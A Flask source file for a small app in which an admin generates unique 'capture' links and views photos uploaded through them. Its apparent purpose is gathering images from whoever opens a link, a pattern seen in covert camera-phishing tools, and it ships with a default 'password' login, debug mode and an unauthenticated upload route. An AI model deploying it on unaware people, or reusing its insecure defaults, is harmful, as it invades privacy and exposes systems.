import os
import uuid
from flask import Flask, render_template, request, redirect, url_for, send_from_directory, Response
from functools import wraps
from werkzeug.security import check_password_hash, generate_password_hash

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['SECRET_KEY'] = 'your_secret_key_here'  # Change this in production

# Ensure upload folder exists
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Simple admin credentials (use environment variables or database in production)
ADMIN_USERNAME = 'admin'
ADMIN_PASSWORD_HASH = generate_password_hash('password')  # Change password

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        auth = request.authorization
        if not auth or not (auth.username == ADMIN_USERNAME and check_password_hash(ADMIN_PASSWORD_HASH, auth.password)):
            return Response('Unauthorized', 401, {'WWW-Authenticate': 'Basic realm="Login Required"'})
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
def index():
    return redirect(url_for('generate_link'))

@app.route('/generate_link')
@admin_required
def generate_link():
    token = str(uuid.uuid4())
    link = url_for('capture', token=token, _external=True)
    return render_template('generate_link.html', link=link)

@app.route('/capture/<token>')
def capture(token):
    return render_template('capture.html', token=token)

@app.route('/upload_photo', methods=['POST'])
def upload_photo():
    if 'photo' not in request.files:
        return 'No photo file', 400
    file = request.files['photo']
    if file.filename == '':
        return 'No selected file', 400
    if file:
        filename = f"{uuid.uuid4()}.png"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        return 'Photo uploaded successfully', 200

@app.route('/admin')
@admin_required
def admin():
    photos = os.listdir(app.config['UPLOAD_FOLDER'])
    return render_template('admin.html', photos=photos)

@app.route('/uploads/<filename>')
@admin_required
def uploaded_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

if __name__ == '__main__':
    app.run(debug=True)
